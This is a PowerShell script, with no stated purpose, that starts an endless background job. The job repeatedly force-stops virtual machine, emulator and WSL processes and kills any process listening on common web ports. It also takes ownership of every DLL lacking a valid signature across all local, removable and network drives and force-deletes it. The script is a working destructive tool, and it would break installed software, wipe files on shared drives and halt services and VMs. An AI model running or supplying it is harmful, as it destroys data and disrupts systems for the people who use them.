function Remove-SuspiciousDLLs {
    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { 
        $_.DriveType -in @('Fixed', 'Removable', 'Network') 
    }
    $dlls = Get-ChildItem -Recurse -Path $drives.Root -Filter "*.dll"
    foreach ($dll in $dlls) {
        $cert = Get-AuthenticodeSignature $dll.FullName
        if ($cert.Status -ne "Valid") {
            $processes = Get-WmiObject Win32_Process | Where-Object { 
                $_.CommandLine -like "*$($dll.FullName)*" 
            }
            foreach ($process in $processes) {
                Stop-Process -Id $process.ProcessId -Force -ErrorAction SilentlyContinue
            }
            takeown /f $dll.FullName
            icacls $dll.FullName /inheritance:d
            icacls $dll.FullName /grant:r Administrators:F
            Remove-Item $dll.FullName -Force -ErrorAction SilentlyContinue
        }
    }
}

function Kill-ProcessesOnPorts {
    $ports = @(80, 443, 8080, 8888)
    $connections = Get-NetTCPConnection -State Listen | Where-Object { $_.LocalPort -in $ports }
    foreach ($conn in $connections) {
        $pid = $conn.OwningProcess
        Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
    }
}

function Stop-AllVMs {
    # Expanded list of VM-related process names
    $vmProcesses = @(
        # VMware-related processes
        "vmware-vmx",     # VMware VM executable
        "vmware",         # VMware Workstation/Player main process
        "vmware-tray",    # VMware tray icon
        "vmwp",           # VMware Worker Process
        "vmnat",          # VMware Network Address Translation
        "vmnetdhcp",      # VMware DHCP service
        "vmware-authd",   # VMware Authentication Daemon
        "vmware-usbarbitrator", # VMware USB Arbitrator
        # Hyper-V-related processes
        "vmms",           # Hyper-V Virtual Machine Management Service
        "vmcompute",      # Hyper-V Host Compute Service
        "vmsrvc",         # Hyper-V Virtual Machine Service
        "vmwp",           # Hyper-V Worker Process (also used by VMware, context-dependent)
        "hvhost",         # Hyper-V Host Service
        "vmmem",          # Hyper-V Memory Manager (used by WSL2 VMs too)
        # VirtualBox-related processes
        "VBoxSVC",        # VirtualBox Service
        "VBoxHeadless",   # VirtualBox Headless VM Process
        "VirtualBoxVM",   # VirtualBox VM Process (newer versions)
        "VBoxManage",     # VirtualBox Management Interface
        # QEMU/KVM-related processes
        "qemu-system-x86_64", # QEMU x86_64 emulator
        "qemu-system-i386",   # QEMU i386 emulator
        "qemu-system-arm",    # QEMU ARM emulator
        "qemu-system-aarch64",# QEMU ARM64 emulator
        "kvm",            # Kernel-based Virtual Machine (generic)
        "qemu-kvm",       # QEMU with KVM acceleration
        # Parallels-related processes
        "prl_client_app", # Parallels Client Application
        "prl_cc",         # Parallels Control Center
        "prl_tools_service", # Parallels Tools Service
        "prl_vm_app",     # Parallels VM Application
        # Other virtualization platforms
        "bhyve",          # FreeBSD Hypervisor (bhyve VM process)
        "xen",            # Xen Hypervisor generic process
        "xenservice",     # XenService for XenServer
        "bochs",          # Bochs Emulator
        "dosbox",         # DOSBox (emulator often used for legacy VMs)
        "utm",            # UTM (macOS virtualization tool based on QEMU)
        # Windows Subsystem for Linux (WSL) and related
        "wsl",            # WSL main process
        "wslhost",        # WSL Host process
        "vmmem",          # WSL2 VM memory process (shared with Hyper-V)
        # Miscellaneous or niche VM tools
        "simics",         # Simics Simulator
        "vbox",           # Older VirtualBox process shorthand
        "parallels"     # Parallels generic process shorthand
)
         $processes = Get-Process
        $vmRunning = $processes | Where-Object { $vmProcesses -contains $_.Name }
        if ($vmRunning) {
            $vmRunning | Format-Table -Property Id, Name, Description -AutoSize
            foreach ($process in $vmRunning) {
                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
            }
      }
}
    
    Start-Job -ScriptBlock {
    while ($true) {
        Stop-AllVMs
        Remove-SuspiciousDLLs
        Kill-ProcessesOnPorts
    }
}